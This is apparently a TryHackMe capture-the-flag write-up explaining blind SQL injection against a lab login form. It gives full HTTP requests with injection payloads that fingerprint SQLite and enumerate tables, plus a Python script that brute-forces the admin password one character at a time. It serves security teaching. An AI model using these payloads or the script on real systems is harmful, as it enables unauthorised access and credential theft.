# Challenge 8 - Vulnerable Startup: Broken Authentication 3 (Blind Injection)

> This challenge has the same vulnerability as the previous one. However, it is no longer possible to extract data from the Flask session cookie or via the username display. The login form still has the same vulnerability, but this time the goal is to abuse the login form with blind SQL injection to extract the admin's password.

From the previous exercise, we know the backend SQL query used for authentication looks something like:

```sql
SELECT id, username FROM $USER_TABLE WHERE username = '$USERNAME' AND password = '$PASSWORD'
```

The first step is to validate the presence of the SQL injection vulnerability and determine whether it is possible to leverage it to ask the database questions and interpret its answers.

```http
POST /challenge3/login HTTP/1.1
Host: 10.10.205.129:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: http://10.10.205.129:5000
DNT: 1
Connection: close
Referer: http://10.10.205.129:5000/challenge3/login?next=http%3A%2F%2F10.10.205.129%3A5000%2Fchallenge3%2Fhome
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+1+ELSE+0+END)=1--&password=pass
```

This injection causes the database to return the record with username `admin` and thus, authenticate the user.

```http
POST /challenge3/login HTTP/1.1
Host: 10.10.205.129:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: http://10.10.205.129:5000
DNT: 1
Connection: close
Referer: http://10.10.205.129:5000/challenge3/login?next=http%3A%2F%2F10.10.205.129%3A5000%2Fchallenge3%2Fhome
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+AND+(SELECT+CASE+WHEN+(1=2)+THEN+1+ELSE+0+END)=1--&password=pass
```

However, this injection causes the database to return no records from the database, which results in not authenticating the user.

This not only proves the existence of the SQL injection vulnerability, but also the fact that it is possible to ask questions to the database and interpret its responses, which is critical for blind SQL injection.

The next step is to determine the database type.

```http
POST /challenge3/login HTTP/1.1
Host: 10.10.205.129:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
Origin: http://10.10.205.129:5000
DNT: 1
Connection: close
Referer: http://10.10.205.129:5000/challenge3/login?next=http%3A%2F%2F10.10.205.129%3A5000%2Fchallenge3%2Fhome
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+AND+(SELECT+CASE+WHEN+(sqlite_version())+THEN+1+ELSE+0+END)=1--&password=pass
```

The web application successfully authenticated the user upon submitting this request, indicating that the backend database is SQLite.

Determine how many non-SQLite system tables there are.

```http
POST /challenge3/login HTTP/1.1
Host: 10.10.205.129:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Origin: http://10.10.205.129:5000
DNT: 1
Connection: close
Referer: http://10.10.205.129:5000/challenge3/login?next=http%3A%2F%2F10.10.205.129%3A5000%2Fchallenge3%2Fhome
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+AND+(SELECT+CASE+WHEN+(COUNT(*)=1)+THEN+1+ELSE+0+END+FROM+sqlite_master+WHERE+type='table'+AND+name+NOT+LIKE+'sqlite_%')=1--&password=pass
```

This request successfully authenticates the user, indicating that there is only one non-SQLite system table. Determine its name.

```http
POST /challenge3/login HTTP/1.1
Host: 10.10.205.129:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 158
Origin: http://10.10.205.129:5000
DNT: 1
Connection: close
Referer: http://10.10.205.129:5000/challenge3/login?next=http%3A%2F%2F10.10.205.129%3A5000%2Fchallenge3%2Fhome
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+AND+(SELECT+CASE+WHEN+(LENGTH(name)=5)+THEN+1+ELSE+0+END+FROM+sqlite_master+WHERE+type='table'+AND+name+NOT+LIKE+'sqlite_%')=1--&password=pass
```

This request indicates that the table name is five characters long. Iterating through the characters in the alphabet:

```http
POST /challenge3/login HTTP/1.1
Host: 10.10.205.129:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 156
Origin: http://10.10.205.129:5000
DNT: 1
Connection: close
Referer: http://10.10.205.129:5000/challenge3/login?next=http%3A%2F%2F10.10.205.129%3A5000%2Fchallenge3%2Fhome
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+AND+(SELECT+CASE+WHEN+(SUBSTR(name,1,1)='u')+THEN+1+ELSE+0+END+FROM+sqlite_master+WHERE+type='table'+AND+name+NOT+LIKE+'sqlite_%')=1--&password=pass
```

The name of the table is `users`.

The goal here is the password of the `admin` user. It can be assumed that the relevant columns are `username` and `password`, so try them to determine the length of the password.

```http
POST /challenge3/login HTTP/1.1
Host: 10.10.205.129:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 130
Origin: http://10.10.205.129:5000
DNT: 1
Connection: close
Referer: http://10.10.205.129:5000/challenge3/login?next=http%3A%2F%2F10.10.205.129%3A5000%2Fchallenge3%2Fhome
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+AND+(SELECT+CASE+WHEN+(LENGTH(password)=37)+THEN+1+ELSE+0+END+FROM+users+WHERE+username='admin')=1--&password=pass
```

The request validates that the columns are `username` and `password` and also that `admin`'s password is 37 characters long. The password is presumably a TryHackMe flag of the format `THM{$32_CHARACTER_HASH}`.

The following script brute forces each letter in the flag:

```python
import string
import requests


host = "10.10.205.129"
username = "admin"
length = 37
keyspace = string.printable[:-5]

with open("password.txt", "a") as f:
    for i in range(1, length + 1):
        for c in keyspace:
            response = requests.post(
                f"http://{host}:5000/challenge3/login",
                data={
                    "username": f"admin' AND (SELECT CASE WHEN (SUBSTR(password,{i},1)=CAST(X'{hex(ord(c)).split('x')[-1]}' AS TEXT)) THEN 1 ELSE 0 END FROM users WHERE username='{username}')=1--",
                    "password": "pass"
                },
                allow_redirects=False
            )

            print(f"[*] Status: character index {i}, character {c}, response code {response.status_code}", end="\r")
            if response.status_code == 302:
                f.write(c)
                f.flush()
                break
    f.write("\n")
```

Notice that the script compares each letter in the password to the statement `CAST(X'{hex(ord(c)).split('x')[-1]}' AS TEXT)`. It turns out that the web application first converts all characters to lowercase in the input `username` before placing it into the SQL query. This means that attempting to compare it to the character `T` would actual result in it being compared to the character `t`, which wouldn't return true. Thus, instead of comparing each character to its character literal equivalent, it is compared to a statement that casts the hex byte of each character into its character literal equivalent. This effectively achieves the same goal and gets around the lowercase restriction.

`admin`'s password, the THM flag, is written to `password.txt`.
